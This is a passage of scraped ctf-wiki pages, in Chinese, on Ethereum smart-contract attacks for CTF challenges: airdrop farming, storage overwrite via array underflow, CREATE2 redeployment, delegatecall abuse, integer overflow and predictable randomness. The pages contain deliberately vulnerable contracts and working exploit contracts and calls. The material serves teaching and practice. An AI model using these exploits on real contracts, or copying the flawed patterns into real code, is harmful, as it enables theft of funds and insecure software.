blockchain](https://github.com/garzon/my_ctf_challenges_source_code/tree/master/DDCTF_2018/mini_blockchain)\n", "timestamp": "2025-10-21T22:02:41.211638"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/airdrop-hunting.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/airdrop-hunting.md", "content": "# Airdrop Hunting\n\n## 原理\n薅羊毛攻击指使用多个不同的新账户来调用空投函数获得空投币并转账至攻击者账户以达到财富累计的一种攻击方式。这类攻击方式较为普通且常见，只要是有空投函数的合约都能够进行薅羊毛。其中首个自动化薅羊毛攻击出现在 [Simoleon](https://paper.seebug.org/646/) 上。\n\n## 例子\n以数字经济大赛 2019 的 jojo 一题为例，讲解一下如何进行薅羊毛攻击。题目合约的源码如下：\n```solidity\npragma solidity ^0.4.24;\n\ncontract jojo {\n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    address owner;\n        \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    event SendFlag(string b64email);\n    \n    function payforflag(string b64email) public {\n        require(balanceOf[msg.sender] >= 100000);\n        emit SendFlag(b64email);\n    }\n    \n    function jojogame() payable{\n        uint geteth = msg.value / 1000000000000000000;\n        balanceOf[msg.sender] += geteth;\n    }\n    \n    function gift() public {\n        assert(gift[msg.sender] == 0);\n        balanceOf[msg.sender] += 100;\n        gift[msg.sender] = 1;\n    }\n    \n    function transfer(address to,uint value) public{\n        assert(balanceOf[msg.sender] >= value);\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n    \n}\n```\n\n可以发现我们需要满足 balanceOf[msg.sender] >= 100000 才可以得到 flag。\n\n题目中有空投函数，每次空投可以使 balance 增加 100。\n\n```solidity\nfunction gift() public {\n    assert(gift[msg.sender] == 0);\n    balanceOf[msg.sender] += 100;\n    gift[msg.sender] = 1;\n}\n```\n\n并且也有转账函数，可以将 balance 转给其他用户。\n\n```solidity\nfunction transfer(address to,uint value) public{\n    assert(balanceOf[msg.sender] >= value);\n    balanceOf[msg.sender] -= value;\n    balanceOf[to] += value;\n}\n```\n\n那么我们可以使用薅羊毛的攻击方式，创建 1000 个临时合约来调用空投函数，并转账给主合约来使得 balanceOf[msg.sender] >= 100000。\n\n```solidity\ncontract attack{\n    function attack_airdrop(int num){\n        for(int i = 0; i < num; i++){\n            new middle_attack(this);\n        }\n    }\n    \n    function get_flag(string email){\n        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);\n        target.payforflag(email);\n    }\n}\n\n\ncontract middle_attack{\n    constructor(address addr){\n        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);\n        target.gift();\n        target.transfer(addr,100);\n    }\n}\n```\n\n## 题目\n\n### 数字经济大赛 2019\n- 题目名称 jojo\n\n### RoarCTF 2019\n- 题目名称 CoinFlip\n\n### QWB 2019\n- 题目名称 babybet\n\n### bctf 2018\n- 题目名称 Fake3d\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n\n## 参考\n- [首个区块链 token 的自动化薅羊毛攻击分析](https://paper.seebug.org/646/)\n- [数字经济大赛 2019 - jojo](https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo)\n\n", "timestamp": "2025-10-21T22:02:41.679293"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/arbitrarywrite.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/arbitrarywrite.md", "content": "# Arbitrary Writing\n\n## 原理\n\n动态数组的任意 Storage 存储写漏洞，根据 [官方文档](https://docs.soliditylang.org/en/v0.8.1/internals/layout_in_storage.html#) 介绍，可总结如下\n\n- EVM 中，有三个地方可以存储变量，分别是 Memory、Stack 和 Storage。Memory 和 Stack 是在执行期间临时生成的存储空间，主要负责运行时的数据存储，Storage 是永久存在于区块链中的变量。\n    + Memory: 内存，生命周期仅为整个方法执行期间，函数调用后回收，因为仅保存临时变量，故 GAS 开销很小\n    + Storage: 永久储存在区块链中，由于会永久保存合约状态变量，故 GAS 开销也最大\n    + Stack: 存放部分局部值类型变量，几乎免费使用的内存，但有数量限制\n\n- EVM 对每一个智能合约维护了一个巨大的 **key-value** 的存储结构，用于持久化存储数据，我们称这片区域为 Storage。除了 map 映射变量和变长数组以外的所有类型变量，在 Storage 中是依次连续从 slot 0 开始排列的，一共有 2^256 个 slot，每个 slot 可以存储 32 字节的数据。Storage 存储结构是在合约创建的时候就确定好的，它取决于合约所声明状态变量，但是内容可以通过 Transaction 改变。\n- Storage 变量大致分为 4 种类型：定长变量、结构体、map 映射变量和变长数组。如果多个变量占用的大小小于 32 字节，按照紧密打包原则，会尽可能打包到单个 slot 中，具体规则如下：\n    + 在 slot 中，是按照低位对齐存储的，即大端序\n    + 基本类型变量存储时仅存储它们实际所需的字节数\n    + 如果基本类型变量不能放入某个 slot 余下的空间，它将被放入下一个 slot\n    + map 和变长数组总是使用一个全新的 slot，并占用整个 slot，但对于其内部的每个变量，还是要遵从上面的规则\n\n### slot 计算规则\n\n首先我们分析一下各种对象结构在 EVM 中的存储和访问情况\n\n#### 定长变量和结构体\n\nSolidity 中的定长定量在定义的时候，其长度就已经被限制住了。比如定长整型（uint、uint8），地址常量（address），定长字节数组（bytes1-32）等，这类的变量在 Storage 中是尽可能打包成 32 字节的块顺序存储的。\n\nSolidity 的结构体并没有特殊的存储模型，在 Storage 中的存储可以按照定长变量规则分析。\n\n#### Map 映射变量\n\n在 Solidity 中，并不存储 map 的键，只存储键对应的值，值是通过键的 hash 索引来找到的。用 $slotM$ 表示 map 声明的 slot 位置，用 $key$ 表示键，用 $value$ 表示 $key$ 对应的值，用 $slotV$ 表示 $value$ 的存储位置，则\n\n- $slotV = keccak256(key|slotM)$\n\n- $value = sload(slotV)$\n\n#### 变长数组\n\n用 $slotA$ 表示变长数组声明的位置，用 $length$ 表示变长数组的长度，用 $slotV$ 表示变长数组数据存储的位置，用 $value$ 表示变长数组某个数据的值，用 $index$ 表示 $value$ 对应的索引下标，则\n\n- $length = sload(slotA)$\n\n- $slotV = keccak256(slotA) + index$\n\n- $value = sload(slotV)$\n\n变长数组在编译期间无法知道数组的长度，没办法提前预留存储空间，所以 Solidity 就用 $slotA$ 位置存储了变长数组的长度\n\n!!! note\n    注：变长数组具体数据存放在 keccak256 哈希计算之后的一片连续存储区域，这一点与 Map 映射变量不同。\n\n### 漏洞介绍\n\n在以太坊 EVM 的设计思路中，所有的 Storage 变量共用一片大小为 2^256*32 字节的存储空间，没有各自的存储区域划分。\n\nStorage 空间即使很大也是有限大小，当变长数组长度很大时，考虑极端情况，如果长度达到 2^256，则可对任意 Storage 变量进行读写操作，这是非常可怕的。\n\n## 例子\n\n### Source\n\n```solidity\npragma solidity ^0.4.24;\n\ncontract ArrayTest  {\n\n    address public owner;\n    bool public contact;\n    bytes32[] public codex;\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function record(bytes32 _content) public {\n        codex.push(_content);\n    }\n\n    function retract() public {\n        codex.length--;\n    }\n\n    function revise(uint i, bytes32 _content) public {\n        codex[i] = _content;\n    }\n}\n```\n\n这里攻击者如何才能成为 owner 呢？其中 owner 最初为 0x73048cec9010e92c298b016966bde1cc47299df5\n\n### Analyse\n\n- 数组 codex 的 slot 为 1 ，同时这也是存储数组 length 的地方，而 codex 的实际内容存储在 keccak256(bytes32(1)) 开始的位置\n\n!!! info\n    Keccak256 是紧密打包的，意思是说参数不会补位，多个参数也会直接连接在一起，所以要用 keccak256(bytes32(1))\n\n- 这样我们就知道了 codex 实际的存储的 slot ，可以将动态数组内变量的存储位计算方法概括为: array[index] == sload(keccak256(slot(array)) + index). \n\n- 因为总共有 2^256 个 slot ，要修改 slot 0 ，假设 codex 实际所在 slot x ，(对于本题来说，数组的 slot是 1 , x=keccak256(bytes32(1))) ，那么当我们修改 codex[y]，(y=2^256-x+0) 时就能修改 slot 0 ，从而修改 owner\n    - 计算 codex 位置为 slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\n    - 所以 y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0\n    - 即 y = 35707666377435648211887908874984608119992236509074197713628505308453184860938\n\n- 可以看到 y 很大，我们要修改 codex[y] ，那就要满足 y < codex.length ，而这个时候 codex.length =0 ，但是我们可以通过 retract() 使 length 下溢，然后就可以操纵 codex[y] 了\n- 由上面已经计算出 codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] 对应的存储位就是 slot 0 ，而 slot 0 中同时存储了 contact 和 owner ，我们只需将 owner 换成 attacker 即可，假设 attacker 地址是 0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2，则如下所示\n\n```\ncontract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2')\n```\n\n## 题目\n\n### XCTF_final 2019\n- 题目名称 Happy_DOuble_Eleven\n\n### Balsn 2019\n- 题目名称 Bank\n\n### 第一届钓鱼城杯 2020\n- 题目名称 StrictMathematician\n\n### RCTF 2020\n- 题目名称 roiscoin\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:41.800643"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/create2.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/create2.md", "content": "# CREATE2\n\n`CREATE2` 是以太坊在“君士坦丁堡”这次硬分叉升级中引入的一个新操作码，不同于 `CREATE`，它使用新的方式来计算合约地址，让生成的合约地址更具有可控性。通过 `CREATE2` 可以延伸出很多有意思的玩法，在 CTF 中最常见的就是利用这种可控性，在同一个地址先后部署字节码完全不同的合约。\n\n## 原理\n\n### CREATE\n\n如果利用外部账户或者使用 `CREATE` 操作码的合约账户创建一个合约，那么很容易就能确定被创建合约的地址。每个账户都有一个与之关联的 `nonce`：对外部账户而言，每发送一个交易，`nonce` 就会随之 `+1`；对合约账户而言，每创建一个合约，`nonce` 就会随之 `+1`。新合约的地址由创建合约交易的发送者账户地址及其 `nonce` 值计算得到，其具体公式如下：\n\n```python\nkeccak256(rlp.encode(address, nonce))[12:]\n```\n\n### CREATE2\n\n不同于原来的 `CREATE` 操作码，在合约地址的计算方法上，`CREATE2` 不再依赖于账户的 `nonce`，而是对以下参数进行哈希计算，得出新的地址：\n\n- 合约创建者的地址（`address`)\n- 作为参数的混淆值（`salt`）\n- 合约创建代码    (`init_code`)\n\n具体的计算公式如下：\n\n```python\nkeccak256(0xff ++ address ++ salt ++ keccak256(init_code))[12:]\n```\n\n一个需要注意的重要细节是，计算合约地址所需的最后一个参数并非合约代码，而是其创建代码。该代码是用来创建合约的，合约创建完成后将返回运行时字节码。\n\n这意味着，如果我们控制了合约的创建代码并使其保持不变，然后控制合约构造函数返回的运行时字节码，那么我们很容易就能做到在同一个地址上，反复部署完全不同的合约。事实上 `CREATE2` 这种让合约在部署后可以被重新更改的特性存在着潜在的安全问题，也引起了人们对其的[讨论](https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614)。\n\n在 CTF 中，这种特性往往会被用来作为一个技巧，通过在同一个地址上部署不同的合约用来 bypass 不同的校验。\n\n## 例子\n\n以 2019 Balsn CTF 的 Creativity 的 WP 提供的 PoC 作为例子，讲解一下 `CREATE2` 的巧妙使用：\n\n```solidity\npragma solidity ^0.5.10;\n\ncontract Deployer {\n    bytes public deployBytecode;\n    address public deployedAddr;\n\n    function deploy(bytes memory code) public {\n        deployBytecode = code;\n        address a;\n        // Compile Dumper to get this bytecode\n        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';\n        assembly {\n            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)\n        }\n        deployedAddr = a;\n    }\n}\n\ncontract Dumper {\n    constructor() public {\n        Deployer dp = Deployer(msg.sender);\n        bytes memory bytecode = dp.deployBytecode();\n        assembly {\n            return (add(bytecode, 0x20), mload(bytecode))\n        }\n    }\n}\n```\n\n当我们每次利用 `deploy(code)` 函数来部署预期构造的合约时，由于实际上的 `init_code` 都是同样的 `dumperBytecode`，再加上确定的合约地址以及 `salt`，所以通过 `deploy(code)` 部署的合约最终会部署在同一个地址上。然后被加载的合约在构造函数执行的时候，会跳转到调用函数时传入的 `code` 上，所以不管我们用 `deploy(code)` 函数部署什么合约，其最终都会部署到同一个地址上。\n\n在知道 `Deployer` 合约地址是 0x99Ed0b4646a5F4Ee0877B8341E9629e4BF30c281 的情况下，我们可以计算部署合约的地址为 0x4315DBef1aC19251d54b075d29Bcc4E81F1e3C73：\n\n```solidity\nfunction getAddress(address addr, bytes memory bytecode, uint salt) public view returns (address) {\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            bytes1(0xff),\n            addr,\n            salt,\n            keccak256(bytecode)\n        )\n    );\n\n    // NOTE: cast last 20 bytes of hash to address\n    return address(uint160(uint256(hash)));\n}\n```\n\n利用该合约，我们成功地在同一个地址上先后上部署了两个不同的合约：\n\n![第一次部署](./figure/create2_0.png)\n![第二次部署](./figure/create2_1.png)\n\n\n## 题目\n\n### Balsn 2019\n- 题目名称 Creativity\n\n### QWB 2020\n- 题目名称 EasyAssembly\n\n## 参考\n\n- [EIP-1014: Skinny CREATE2](https://eips.ethereum.org/EIPS/eip-1014)\n- [充分利用 CREATE2](https://ethfans.org/posts/getting-the-most-out-of-create2)\n- [Balsn CTF 2019 - Creativity](https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/)\n", "timestamp": "2025-10-21T22:02:41.909049"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/delegatecall.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/delegatecall.md", "content": "# Delegatecall\n\n> There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.\n\n## 原理\n\n### 三种调用函数\n\n在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。\n\n#### 调用模型\n\n```\n<address>.call(...) returns (bool)\n<address>.callcode(...) returns (bool)\n<address>.delegatecall(...) returns (bool)\n```\n\n这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。\n\n在函数调用的过程中，Solidity 中的内置变量 `msg` 会随着调用的发起而改变，`msg` 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。\n\n#### 异同点\n\n* call: 调用后内置变量 `msg` 的值会修改为调用者，执行环境为被调用者的运行环境\n* delegatecall: 调用后内置变量 `msg` 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）\n* callcode: 调用后内置变量 `msg` 的值会修改为调用者，但执行环境为调用者的运行环境\n\n!!! note\n    Warning: \"callcode\" has been deprecated in favour of \"delegatecall\"\n\n### Delegatecall 滥用\n\n#### 设计初衷\n\n* 函数原型 `<address>.delegatecall(...) returns (bool)`\n* 函数设计的目的是为了使用给定地址的代码，其他信息则使用当前合约（如存储、余额等）\n* 某种程度上也是为了代码的复用\n\n#### 威胁分析\n\n参考函数原型，我们知道，delegatecall 调用有 `address` 和 `msg.data` 两个参数\n\n* 若 `msg.data` 可控，则可调用 `address` 处任意函数\n\n```solidity\npragma solidity ^0.4.18;\n\ncontract Delegate {\n\n    address public owner;\n\n    function Delegate(address _owner) public {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract Delegation {\n\n    address public owner;\n    Delegate delegate;\n\n    function Delegation(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    function() public {\n        if(delegate.delegatecall(msg.data)) {\n            this;\n        }\n    }\n}\n```\n\n对于这个例子，攻击者如何成为 owner 呢？\n\n其实我们只需调用 Delegation 的假 `pwn()` 即可，这样就会触发 Delegation 的 `fallback`，这样 `pwn` 的函数签名哈希就会放在 `msg.data[0:4]` 了，这样就会只需 delegate 的 `pwn()` 把 owner 变成自己，如下所示即可（这就是因为 `msg.data` 可控导致的）\n\n```\ncontract.sendTransaction({data: web3.sha3(\"pwn()\").slice(0,10)})\n```\n\n* 若 `msg.data` 和 `address` 都可控，则可调用任意 `address` 处的任意函数\n\n同理，只不过额外加了 `address` 是可控的这个条件，不再作分析\n\n#### 原因分析\n\n```solidity\npragma solidity ^0.4.23;\n\ncontract A {\n    address public c;\n    address public b;\n    \n    function test() public returns (address a) {\n        a = address(this);\n        b = a;\n    }\n}\n\ncontract B {\n    address public b;\n    address public c;\n    \n    function withdelegatecall(address testaddress) public {\n        testaddress.delegatecall(bytes4(keccak256(\"test()\")));\n    }\n}\n```\n\n来看上面这个例子，假设合约 A 部署后地址为 address_a，合约 B 部署后地址为 address_b，使用 外部账户 C 调用 withdelegatecall(address_a)，address_a 和 address_b 中的 b、c 变量分别是多少？结果如下\n\naddress_a 合约中，c = 0，b = 0；address_b 合约中，b = 0，c = address_b\n\n修改的不是 B 合约中的 b 变量，而是修改了 B 合约中的 c 变量\n\n![delegatecall](./figure/delegatecall.png)\n\nsstore 即访存指令，可以看到写入的是 1 号存储位，1号存储位 在 B 合约中即对应变量 c，在 A 合约中则对应变量 b，所以事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。\n\n## 例子\n\n### Source\n\n[ethernaut](https://ethernaut.openzeppelin.com/) 第 16 题\n\n### Analyse\n\n- 我们调用 Preservation 的 `setFirstTime` 函数实际通过 `delegatecall` 执行了 LibraryContract 的 `setTime` 函数，修改了 slot 1 ，也就是修改了 timeZone1Library 变量\n- 这样，我们第一次调用 `setFirstTime` 将 timeZone1Library 变量修改为我们的恶意合约的地址，第二次调用 `setFirstTime` 就可以执行我们的任意代码了\n\n### Exp\n\n```solidity\npragma solidity ^0.4.23;\n\ncontract Preservation {\n\n  // public library contracts \n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {\n    timeZone1Library = _timeZone1LibraryAddress; \n    timeZone2Library = _timeZone2LibraryAddress; \n    owner = msg.sender;\n  }\n \n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public {\n    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);\n  }\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public {\n    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);\n  }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n  // stores a timestamp \n  uint storedTime;  \n\n  function setTime(uint _time) public {\n    storedTime = _time;\n  }\n}\n\ncontract attack {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    \n    address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c;\n    Preservation target = Preservation(instance_address);\n    function attack1() {\n        target.setFirstTime(uint(address(this)));\n    }\n    function attack2() {\n        target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2));\n    }\n    function setTime(uint _time) public {\n        timeZone1Library = address(_time);\n        timeZone2Library = address(_time);\n        owner = address(_time);\n    }\n}\n```\n\n先调用 `attack1()` ，再调用 `attack2()` 即可\n\n### Result\n\n![](./figure/result.png)\n\n## 题目\n\n### RealWorld 2018\n- 题目名称 Acoraida Monica\n\n### Balsn 2019\n- 题目名称 Creativity\n\n### 第五空间 2020\n- 题目名称 SafeDelegatecall\n\n### 华为鲲鹏计算 2020\n- 题目名称 boxgame\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n\n", "timestamp": "2025-10-21T22:02:42.014664"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/jump-oriented-programming.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/jump-oriented-programming.md", "content": "# Jump Oriented Programming\n\n## 原理\n\n类似于 pwn 中的 ROP，EVM 中也有 JOP（Jump Oriented Programming）。JOP 的思想和 ROP 是相似的：串联起一个个小的代码片段（gadget），达成一定的目的。\n\n涉及到JOP 的是如下三个字节码：\n\n- 0x56 JUMP\n- 0x57 JUMPI\n- 0x5B JUMPDEST\n\n在 EVM 中的无条件跳转 `JUMP` 和条件跳转 `JUMPI` 的目的地都必须是 `JUMPDEST`，这点和 ROP 可以任选返回地址不同。\n\n另外需要注意的是，EVM 虽然使用的是变长指令，但是不允许像 ROP 那样跳到一条指令的中间。比如 64 位的 `pop r15` 是 `A_`，ROP 时直接落在第二个字节则可以当成 `pop rdi` 使用；EVM `PUSH1 0x5B` 中的 `0x5B` 则不能当作 `JUMPDEST` 使用。\n\n通常需要用到 JOP 的合约在编写时都夹杂着内联汇编的后门，需要人工逆向识别查找两样东西：\n\n1. 通常控制流可达、可以控制跳转地址的起点\n1. `JUMPDEST` 之后实现了一些特殊功能，然后再接一个 `JUMP` 指令的各种 gadget\n\ngadget 需要实现的功能因题目要求或考察点而异，比如要实现一个外部合约的调用，就要先按照顺序将各种偏移、gas等数据布置在栈上。在 JOP 的最后需要一个 `JUMPDEST; STOP` 作为结束的着陆点，否则一旦执行出错就会导致交易回滚。\n\n除了以上的三个字节码，EIP-2315 还提出了 `BEGINSUB`、`RETURNSUB`、`JUMPSUB` 三个字节码。其中 `JUMPSUB` 和 `JUMP` 相似，只是跳转的目的地必须是 `BEGINSUB`；而 `RETURNSUB` 相当于 ROP 中的 `ret`，对目标地址没有限制。EIP-2315 在柏林升级前曾被列入升级列表，不久后又被移除，目前仍处于草案阶段。\n\n## 题目\n\n### RealWorldCTF Final 2018\n- 题目名称 Acoraida Monica\n\n### RealWorldCTF 3rd 2021\n- 题目名称 Re: Montagy\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:42.435761"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/overflow-underflow.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/overflow-underflow.md", "content": "# Integer Overflow and Underflow\n\n## 原理 \n\nEVM的整数有 `int` 和 `uint` 两种，对应有无符号的情况。在 `int` 或 `uint` 后可以跟随一个8的倍数，表示该整数的位数，如8位的 `uint8`。位数上限为256位，`int` 和 `uint` 分别是 `int256` 和 `uint256` 的别名，一般 `uint` 使用的更多。\n\n在整数超出位数的上限或下限时，就会静默地进行取模操作。通常我们希望费用向上溢出变小，或者存款向下溢出变大。整数溢出漏洞可以使用 SafeMath 库来防御，当发生溢出时会回滚交易。\n\n## 例子\n\n以 Capture The Ether 的 Token sale 为例：\n\n```solidity\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}\n```\n\n在本题中，购买单个代币需要支付 1 ether，即 `msg.value == numTokens * PRICE_PER_TOKEN`。在EVM中，货币以 wei 为单位，1 ether 实际上是 $10 ^ { 18 }$ wei，即 0xde0b6b3a7640000 wei。如果让这里的 `numTokens` 大一些，乘积就可能溢出。例如我们购买 $2 ^ { 256 } // 10 ^ { 18 } + 1$ 个代币，乘上 $10 ^ { 18 }$ 后就发生了溢出，最终花费仅约 0.4 ether 就买到了大量代币。然后我们将买到的代币部分卖出，即可完成题目要求。\n\n整数下溢的一个例子是减法操作。假设有一个合约实现了如下功能：\n\n```solidity\ncontract Bank {\n    mapping(address => uint256) public balanceOf;\n    ...\n    function withdraw(uint256 amount) public {\n        require(balanceOf[msg.sender] - amount >= 0);\n        balanceOf[msg.sender] -= amount;\n        msg.sender.send.value(amount)();\n    }\n}\n```\n\n乍看之下没有问题，实际上 require 一行，`balanceOf[msg.sender]-amount` 的结果作为无符号整数，永远是大于等于 0 的，导致我们可以任意取款。正确的写法是 `require(balanceOf[msg.sender] >= amount)`。\n\n整数下溢的另一个例子与重入攻击有关，如将持有数为 1 的物品卖出两次，或者将 1 ether 存款取出两次，导致结果为负数，储存为 uint 则为巨大的正数。\n\n## 题目\n\n绝大部分重入攻击的题目都涉及到向下溢出，可参照重入攻击的部分。不涉及重入攻击的相对较少，可以参考以下题目。\n\n### ByteCTF 2019\n- 题目名称 hf\n- 题目名称 bet\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:42.559364"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/randomness.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/randomness.md", "content": "# Randomness\n\n本节讨论以太坊中的随机数问题。由于所有以太坊节点在验证交易时，需要计算出相同的结果以达成共识，因此 EVM 本身无法实现真随机数的功能。至于伪随机数，其熵源也是只能是确定值。下面讨论各种随机数的安全性，并介绍回滚攻击。\n\n## 使用私有变量的伪随机数\n\n### 原理\n\n合约使用外界未知的私有变量参与随机数生成。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值，然后计算得到随机数。\n\n### 例子\n\n```solidity\npragma solidity ^0.4.18;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  function Vault(bytes32 _password) public {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n```\n\n直接使用 `web3.eth.getStorageAt` 确定参数调用即可\n\n```\nweb3.eth.getStorageAt(ContractAddress, \"1\", function(x,y){console.info(y);})\n```\n\n## 外部参与的随机数\n\n### 原理\n\n随机数由其他服务端生成。为了确保公平，服务端会先将随机数或者其种子的哈希写入合约中，然后待用户操作之后再公布哈希对应的明文值。由于明文空间有 256 位，这样的随机数生成方法相对安全。但是在明文揭露时，我们可以在状态为 pending 的交易中找到明文数据，并以更高的 gas 抢在之前完成交易确认。\n\n## 使用区块变量的伪随机数\n\n### 原理\n\nEVM 有五个字节码可以获取当前区块的变量，包括 coinbase、timestamp、number、difficulty、gaslimit。这些变量对矿工来说，都是已知或者可操控的，因此在私有链部署的题目中，可以作为恶意的矿工控制随机数的结果。在公开的链如 Ropsten 上，这个方法就不太可行，但我们也可以编写攻击合约，在攻击合约中获取到相同的区块变量值，进一步用相同的算法得到随机数值。\n\n### 例子\n\n```solidity\npragma solidity ^0.4.18;\n\nimport 'openzeppelin-solidity/contracts/math/SafeMath.sol';\n\ncontract CoinFlip {\n\n  using SafeMath for uint256;\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  function CoinFlip() public {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue.div(FACTOR);\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n- 代码处理流程为：\n    - 获得上一块的 hash 值\n    - 判断与之前保存的 hash 值是否相等，相等则会退\n    - 根据 blockValue/FACTOR 的值判断为正或负，即通过 hash 